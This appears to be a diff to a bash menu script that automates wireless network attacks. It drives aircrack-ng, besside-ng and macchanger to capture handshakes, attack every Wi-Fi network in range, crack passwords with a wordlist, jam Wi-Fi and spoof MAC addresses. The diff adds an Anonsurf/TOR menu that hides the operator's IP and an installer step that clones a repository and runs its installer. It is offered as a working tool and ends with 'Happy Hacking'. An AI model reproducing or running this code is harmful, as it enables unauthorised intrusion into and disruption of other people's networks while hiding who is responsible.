@@ -59,41 +59,46 @@ echo -e "      ${Red}[${Blue}2${Red}] ${Green}Hack All Wifi Networks"
 echo -e "      ${Red}[${Blue}3${Red}] ${Green}Decrypt Passowrd(s)"
 echo -e "      ${Red}[${Blue}4${Red}] ${Green}Wifi Jammer"
 echo -e "      ${Red}[${Blue}5${Red}] ${Green}MAC Changer"
-echo -e "      ${Red}[${Blue}6${Red}] ${Green}View log file"
-echo -e "      ${Red}[${Blue}7${Red}] ${Green}Help"
-echo -e "      ${Red}[${Blue}8${Red}] ${Green}Exit\n\n"
+echo -e "      ${Red}[${Blue}6${Red}] ${Green}Anonsurf"
+echo -e "      ${Red}[${Blue}7${Red}] ${Green}View log file"
+echo -e "      ${Red}[${Blue}8${Red}] ${Green}Help"
+echo -e "      ${Red}[${Blue}9${Red}] ${Green}Exit\n\n"
 while true; do
 echo -e "${Green}┌─[${Red}Select Option${Green}]──[${Red}~${Green}]─[${Yellow}Menu${Green}]:"
 read -p "└─────►$(tput setaf 7) " option
 case $option in
-  1) echo -e "\n[${Green}Selected${White}] Option 1 Hack A Wifi Network"
+  1) echo -e "\n[${Green}Selected${White}] Option 1 Hack A Wifi Network.."
      wifiHacking
      ;;
-  2) echo -e "\n[${Green}Selected${White}] Option 2 Hack All Wifi Networks"
+  2) echo -e "\n[${Green}Selected${White}] Option 2 Hack All Wifi Networks.."
      attackAll
      exit 0
      ;;
-  3) echo -e "\n[${Green}Selected${White}] Option 3 Decrypt Passowrd(s)"
+  3) echo -e "\n[${Green}Selected${White}] Option 3 Decrypt Passowrd(s).."
      crack
      exit 0
      ;;
-  4) echo -e "\n[${Green}Selected${White}] Option 4 Wifi Jammer"
+  4) echo -e "\n[${Green}Selected${White}] Option 4 Wifi Jammer..."
      wifiJammer
      exit 0
      ;;
-  5) echo -e "\n[${Green}Selected${White}] Option 5 Changing MAC Address.."
+  5) echo -e "\n[${Green}Selected${White}] Option 5 Changing MAC Address..."
      macChange
      exit 0
      ;;
-  6) echo -e "\n[${Green}Selected${White}] Option 6 View log file"
+  6) echo -e "\n[${Green}Selected${White}] Option 6 Anonsurf..."
+     anonsurf
+     exit 0
+     ;;
+  7) echo -e "\n[${Green}Selected${White}] Option 6 View log..."
      log
      exit 0
      ;;
-  7) echo -e "\n[${Green}Selected${White}] Option 7 Help"
+  8) echo -e "\n[${Green}Selected${White}] Option 7 Help..."
      Help
      exit 0
      ;;
-  8) echo -e "${Red}\n\033[1mThank You for using the script,\nHappy Hacking :)\n"
+  9) echo -e "${Red}\n\033[1mThank You for using the script,\nHappy Hacking :)\n"
      exit 0
      ;;
   *) echo -e "${White}[${Red}Error${White}] Please select correct option...\n"
@@ -123,8 +128,8 @@ echo -e "[${Red}!${White}] Can't find Handshake, waiting ..."
 counter=$((counter+1))
 done
 kill $!
-airmon-ng stop wlan0mon > /dev/null
-rm handshake-01.cap
+sudo airmon-ng stop wlan0mon > /dev/null
+#rm handshake-01.cap
 if grep "unable" logs/error > /dev/null; then
 echo -e "[${Red}$targetName${White}] Exiting can't find Handshake Packet..."
 sleep 0.5
@@ -146,7 +151,7 @@ exit 0
 else
 echo -e "[${Red}!${White}] Unknown error is occured..."
 sleep 0.5
-echo -e "[${Yellow}GitHub${White}] You can email me @ liam@liambendix.com"
+echo -e "[${Yellow}GitHub${White}] You can email me at liam@liambendix.com"
 echo -e "[${Yellow}GitHub${White}] Please send a copy of password and error log files..."
 exit 1
 fi
@@ -170,17 +175,19 @@ attackAll() {
 sudo airmon-ng check kill
 sudo airmon-ng
 sudo airmon-ng start wlan0
-besside-ng wlam0mon
-besside-ng wlan0mon
-airmon-ng stop wlan0mon
-ifconfig wlan0 up
-systemctl start NetworkManager
+sudo besside-ng wlam0mon
+sudo besside-ng wlan0mon
+sudo airmon-ng stop wlan0mon
+sudo ifconfig wlan0 up
+sudo systemctl start NetworkManager
 }
 
 crack() {
 wordlist
-aircrack-ng -w wordlist.txt wep.cap
-aircrack-ng -w wordlist.txt wpa.cap
+sudo aircrack-ng -w wordlist.txt wep.cap
+sudo aircrack-ng -w wordlist.txt wpa.cap
+sudo aircrack-ng -a2 -w wordlist.txt *.cap
+sudo aircrack-ng -w wordlist.txt *.cap
 }
 
 
@@ -253,47 +260,137 @@ done
 spoofMAC(){
 macchanger -s eth0
 macchanger -s wlan0
-ifconfig eth0 down
-ifconfig wlan0 down
-macchanger -r eth0
-macchanger -r wlan0
-ifconfig eth0 up
-ifconfig wlan0 up
+sudo ifconfig eth0 down
+sudo ifconfig wlan0 down
+sudo macchanger -r eth0
+sudo macchanger -r wlan0
+sudo ifconfig eth0 up
+sudo ifconfig wlan0 up
 macchanger -s eth0
 macchanger -s wlan0
 }
 
 RestoreMAC(){
-ifconfig eth0 down
-ifconfig wlan0 down
-macchanger -p eth0
-macchanger -p wlan0
-ifconfig eth0 up
-ifconfig wlan0 up
-macchanger -s eth0
-macchanger -s wlan0
+sudo ifconfig eth0 down
+sudo ifconfig wlan0 down
+sudo macchanger -p eth0
+sudo macchanger -p wlan0
+sudo ifconfig eth0 up
+sudo ifconfig wlan0 up
+sudo macchanger -s eth0
+sudo macchanger -s wlan0
 
 }
 
 showMAC() {
 macchanger -s eth0
 macchanger -s wlan0
+
+
+
 }
 
-log(){
-cat besside.log
-}
 
-spinner() {        ##### Animation while scanning for available networks #####
-sleep 2
-echo -e "[${Green}wlan0mon${White}] Preparing for scan..."
-sleep 3
-spin='/-\|'
-length=${#spin}
-while sleep 0.1; do
-echo -ne "[${Green}wlan0mon${White}] Scanning for available networks...${spin:i--%length:1}" "\r"
+
+
+
+anonsurf (){ 
+       ##### Display available options #####
+echo -e "\n${Yellow}                      [ Select Option To Continue ]\n\n"
+echo -e "      ${Red}[${Blue}1${Red}] ${Green}Start Anonsurf"
+echo -e "      ${Red}[${Blue}2${Red}] ${Green}Show Anonsurf Status"
+echo -e "      ${Red}[${Blue}3${Red}] ${Green}Stop Anonsurf"
+echo -e "      ${Red}[${Blue}4${Red}] ${Green}Restart Anonsurf"
+echo -e "      ${Red}[${Blue}5${Red}] ${Green}Change TOR Identity"
+echo -e "      ${Red}[${Blue}6${Red}] ${Green}Start i2p Services"
+echo -e "      ${Red}[${Blue}7${Red}] ${Green}Stop i2p Services"
+echo -e "      ${Red}[${Blue}8${Red}] ${Green}Show Current IP Address"
+echo -e "      ${Red}[${Blue}9${Red}] ${Green}Exit\n\n"
+while true; do
+echo -e "${Green}┌─[${Red}Select Option${Green}]──[${Red}~${Green}]─[${Yellow}Menu${Green}]:"
+read -p "└─────►$(tput setaf 7) " option
+case $option in
+  1) echo -e "\n[${Green}Selected${White}] Start Anonsurf"
+     anonsurfStart
+     exit 0
+     ;;
+  2) echo -e "\n[${Green}Selected${White}] Show Anonsurf Status"
+     anonsurfStatus
+     exit 0
+     ;; 
+  3) echo -e "\n[${Green}Selected${White}] Stop Anonsurf"
+     anonsurfStop
+     exit 0
+     ;; 
+  4) echo -e "\n[${Green}Selected${White}] Restart Anonsurf"
+     anonsurfRestart
+     exit 0
+     ;; 
+  5) echo -e "\n[${Green}Selected${White}] Changeing Identity Restarting TOR"
+     anonsurfChange
+     exit 0
+     ;; 
+  6) echo -e "\n[${Green}Selected${White}] Start i2p Services"
+     anonsurfStarti2p
+     exit 0
+     ;; 
+  7) echo -e "\n[${Green}Selected${White}] Stop i2p Services"
+     anonsurfStopi2p
+     exit 0
+     ;; 
+  8) echo -e "\n[${Green}Selected${White}] Show your current IP address"
+     anonip
+     exit 0
+     ;; 
+  9) echo -e "\n[${Green}Selected${White}] Going back.."
+     exit 0
+     ;;
+  *) echo -e "${White}[${Red}Error${White}] Please select correct option...\n"
+     ;;
+esac
 done
 }
+
+
+anonsurfStart(){
+sudo anonsurf start
+}
+
+anonsurfStatus(){
+sudo anonsurf status
+}
+
+
+anonsurfStop(){
+sudo anonsurf stop
+}
+
+anonsurfRestart(){
+sudo anonsurf restart
+}
+
+anonsurfChange(){
+sudo anonsurf change
+}
+
+anonsurfStarti2p(){
+sudo anonsurf starti2p
+}
+anonsurfStopi2p(){
+sudo anonsurf stopi2p
+}
+
+anonip(){
+sudo anonsurf myip
+}
+
+
+
+
+      
+
+
+
 
 Help()
 {        ##### Display available options #####
@@ -322,6 +419,13 @@ esac
 done
 }
 
+
+
+
+
+
+
+
 instructions(){
 
 echo "$(tput setaf 2)INSTRUCTIONS:
@@ -341,11 +445,37 @@ You can use method one, without the need of SSH or Ad Hoc. "
 
 fix(){
 apt-get update
+##################### aircrack-ng ##################### 
 apt-get install -y aircrack-ng
+##################### macchanger ##################### 
 apt-get install -y macchanger
+##################### anonsurf ##################### 
+cd /home/superuser/Desktop
+git clone https://github.com/Und3rf10w/kali-anonsurf
+chmod -R 755 kali-anonsurf
+cd kali-anonsurf
+./installer.sh
+apt install ./kali-anonsurf.deb
 echo "$(tput setaf 2)Fixing.. reboot recommended when finished."
 
 
+}
+
+
+
+log(){
+cat besside.log
+}
+
+spinner() {        ##### Animation while scanning for available networks #####
+sleep 2
+echo -e "[${Green}wlan0mon${White}] Preparing for scan..."
+sleep 3
+spin='/-\|'
+length=${#spin}
+while sleep 0.1; do
+echo -ne "[${Green}wlan0mon${White}] Scanning for available networks...${spin:i--%length:1}" "\r"
+done
 }
 
 targeted () {
